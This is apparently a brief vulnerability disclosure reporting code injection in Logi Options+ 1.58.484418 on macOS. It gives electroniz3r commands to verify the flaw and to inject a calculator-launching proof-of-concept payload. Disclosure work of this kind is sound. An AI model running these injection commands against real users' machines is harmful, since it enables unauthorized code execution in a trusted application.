# Logi Options+ product 1.58.484418

Logi Options+ product 1.58.484418 for the MacOS operating system allows code injection.

MacOS version used on test: Sonoma beta 14.2.

Command to check:
```
./electroniz3r verify /Applications/logioptionsplus.app
```
![001](https://github.com/andreluna/logi-options-plus-vuln/assets/2491448/f0a95d6a-5713-4d4b-a55e-28058c594e10)

Exploiting application with electroniz3r and payload using **calc**

Command to check:
```
./electroniz3r inject --predefined-script calc /Applications/logioptionsplus.app
```
![002](https://github.com/andreluna/logi-options-plus-vuln/assets/2491448/c7659aa1-5b65-4b47-a862-bc71c33161cc)

Result:

![004](https://github.com/andreluna/logi-options-plus-vuln/assets/2491448/d56eee21-d574-43d4-82a0-9d3e4d6c60c9)

Application version:

![003](https://github.com/andreluna/logi-options-plus-vuln/assets/2491448/0bc20682-dc16-4049-9fc4-54d4a51bdbc5)

The test was done using the tool: 
https://github.com/r3ggi/electroniz3r
